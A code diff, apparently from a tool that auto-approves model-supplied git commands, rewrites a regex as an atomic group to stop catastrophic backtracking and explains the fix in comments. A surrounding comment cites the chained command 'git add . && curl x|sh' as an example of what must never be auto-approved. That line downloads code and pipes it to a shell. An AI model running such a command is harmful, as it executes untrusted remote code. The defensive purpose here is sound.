@@ -114,8 +114,15 @@ _VALID_FLAGS = set(GATE_INTENT_FLAG.values())
 # A shell separator / expansion anywhere means the command is NOT a single git
 # invocation — so a chained `git add . && curl x|sh` is never auto-approved.
 _SHELL_SEP_RE = re.compile(r"&&|\|\||;|\||\n|\$\(|`")
+# ATOMIC GROUP, and it matters. `(?:-[A-Za-z]\S*\s+|\S+=\S+\s+)*` is two
+# ambiguous alternatives under a `*`, so a long run of option-like tokens that
+# never reaches commit/add/push backtracks exponentially — and the input is a
+# shell command the MODEL supplies. `re.search` holds the interpreter, so
+# neither Stop nor a signal can preempt it: the turn wedges for good. `(?>...)`
+# (Python 3.11+, and this project requires >=3.11) forbids re-entering the
+# group once it has matched, which is exactly the backtracking that explodes.
 _GIT_HEAD_RE = re.compile(
-    r"^\s*git\s+(?:-[A-Za-z]\S*\s+|\S+=\S+\s+)*(?:commit|add|push)\b",
+    r"^\s*git\s+(?>(?:-[A-Za-z]\S*|\S+=\S+)\s+)*(?:commit|add|push)\b",
     re.IGNORECASE)
 
 
